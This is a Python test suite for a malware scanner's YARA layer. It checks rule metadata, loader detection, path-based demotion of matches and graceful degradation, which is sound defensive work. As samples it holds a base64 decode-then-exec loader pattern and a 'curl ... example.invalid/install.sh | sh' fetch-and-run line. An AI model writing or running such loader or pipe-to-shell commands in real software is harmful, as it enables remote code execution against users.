"""YARA analysis layer: packaged rules, match reporting, context and graceful degradation.

Samples are built from harmless fragments: the point is to exercise the *pattern* a rule looks
for, not to ship working malicious code. Hosts are ``example.invalid`` and payloads are
placeholders.
"""

from __future__ import annotations

import base64

import pytest

from app.analysis.analyzers import yara_scan
from app.analysis.analyzers.base import PackageContext, SourceFile
from app.analysis.analyzers.obfuscation import ObfuscationAnalyzer
from app.analysis.findings import Finding
from app.analysis.signals import Code

pytest.importorskip("yara", reason="yara-python is an optional dependency")


def ctx(files: dict[str, str] | None = None, *, binaries: dict[str, bytes] | None = None) -> PackageContext:
    return PackageContext(
        ecosystem="pypi", name="demo", version="1.0.0",
        files=[SourceFile(relpath=k, text=v, size=len(v)) for k, v in (files or {}).items()],
        binaries=dict(binaries or {}),
    )


def run(files: dict[str, str] | None = None, **kw) -> list[Finding]:
    return yara_scan.YaraScanAnalyzer().analyze(ctx(files, **kw))


def matches(findings: list[Finding]) -> list[Finding]:
    return [f for f in findings if f.code == Code.YARA_MATCH and f.weight > 0]


def compiled():
    module, reason = yara_scan.load_yara()
    assert module is not None, f"yara-python unusable: {reason}"
    return yara_scan.packaged_rules(module)


def long_blob() -> str:
    return base64.b64encode(b"import os\n" * 20).decode()


# --------------------------------------------------------------------------- packaged rules
def test_packaged_rules_compile_and_carry_complete_metadata():
    ruleset = compiled()
    assert ruleset.rules is not None
    assert ruleset.loaded.rules, "no rule metadata was collected"
    for key, meta in ruleset.loaded.rules.items():
        assert meta.rule_id.startswith("WX-YARA-"), key
        assert meta.severity in yara_scan.SEVERITY_WEIGHTS, meta.rule_id
        assert 0.0 < meta.confidence <= 1.0, meta.rule_id
        assert meta.description, meta.rule_id


def test_rule_ids_are_unique():
    ids = [meta.rule_id for meta in compiled().loaded.rules.values()]
    assert len(ids) == len(set(ids))


# --------------------------------------------------------------------------- matching
def test_a_decode_then_execute_loader_matches_and_reports_the_rule_not_the_content():
    source = "import base64\nexec(base64.b64decode('" + long_blob() + "'))\n"
    hits = matches(run({"pkg/loader.py": source}))
    assert hits, "expected the packaged loader rule to match"
    evidence = hits[0].evidence
    assert evidence["rule_id"].startswith("WX-YARA-")
    assert evidence["rule_version"] and evidence["description"]
    # Matched string *identifiers* and offsets are reported; the matched bytes are not.
    for entry in evidence.get("strings", []):
        assert entry["identifier"].startswith("$")
        assert "value" not in entry and "data" not in entry
    assert hits[0].location is not None and hits[0].location.file == "pkg/loader.py"


def test_the_two_layers_cover_each_other_on_the_indirect_loader():
    """The packaged rule targets exec applied *directly* to a decoder.

    Routing the payload through a variable evades that signature and the AST obfuscation
    analyzer catches it instead, which is why Warden runs both layers. Neither reports a payload
    too small to carry code - a deliberate false-positive control.
    """
    indirect = "import base64\npayload = base64.b64decode('" + long_blob() + "')\nexec(payload)\n"
    assert matches(run({"pkg/loader.py": indirect})) == []
    codes = {f.code for f in ObfuscationAnalyzer().analyze(ctx({"pkg/loader.py": indirect}))}
    assert Code.ENCODED_EXEC in codes

    tiny = "import base64\np = base64.b64decode('cGxhY2Vob2xkZXI=')\nexec(p)\n"
    assert {f.code for f in ObfuscationAnalyzer().analyze(ctx({"pkg/loader.py": tiny}))} == set()


def test_ordinary_code_does_not_match():
    benign = "import base64\n\n\ndef decode_config(raw: str) -> bytes:\n    return base64.b64decode(raw)\n"
    assert matches(run({"pkg/config.py": benign})) == []


# --------------------------------------------------------------------------- context demotion
CURL_PIPE_SHELL = "#!/bin/sh\nset -e\ncurl -sSL https://example.invalid/install.sh | sh\n"


def test_a_match_in_installed_code_keeps_its_full_weight():
    hits = matches(run({"pkg/provision.sh": CURL_PIPE_SHELL}))
    assert hits, "expected the dropper rule to match a shell script"
    assert hits[0].weight == yara_scan.SEVERITY_WEIGHTS[hits[0].severity.value]
    assert "files only" not in hits[0].message


@pytest.mark.parametrize("path", [
    "vendored-meson/meson/ci/ciimage/opensuse/install.sh",  # the real numpy case
    "docs/examples/install.sh",
    ".github/scripts/install.sh",
    "tests/fixtures/install.sh",
])
def test_a_match_in_a_file_that_never_runs_on_install_is_demoted(path):
    """CI pipelines, vendored tooling, docs and tests ship in the sdist but never execute."""
    hits = matches(run({path: CURL_PIPE_SHELL}))
    assert hits, f"expected a match for {path}"
    finding = hits[0]
    assert finding.weight < yara_scan.SEVERITY_WEIGHTS[finding.severity.value]
    assert finding.confidence < 1.0
    assert "files only" in finding.message


def test_auxiliary_paths_are_recognised_but_ordinary_package_paths_are_not():
    assert yara_scan.is_auxiliary_path("vendored-meson/meson/ci/ciimage/opensuse/install.sh")
    assert yara_scan.is_auxiliary_path("docs/conf.py")
    assert not yara_scan.is_auxiliary_path("pkg/module.py")
    assert not yara_scan.is_auxiliary_path("src/pkg/cli.py")


# --------------------------------------------------------------------------- degradation
def test_the_analyzer_reports_itself_unavailable_when_yara_is_missing(monkeypatch):
    yara_scan.reset_caches()
    monkeypatch.setattr(yara_scan, "load_yara", lambda: (None, "ImportError"))
    status = yara_scan.YaraScanAnalyzer().availability()
    assert status.available is False and status.detail
    yara_scan.reset_caches()


def test_the_analyzer_is_disabled_by_configuration(monkeypatch):
    from app.core.config import settings

    monkeypatch.setattr(settings, "YARA_ENABLED", False)
    yara_scan.reset_caches()
    assert yara_scan.YaraScanAnalyzer().availability().available is False
    yara_scan.reset_caches()
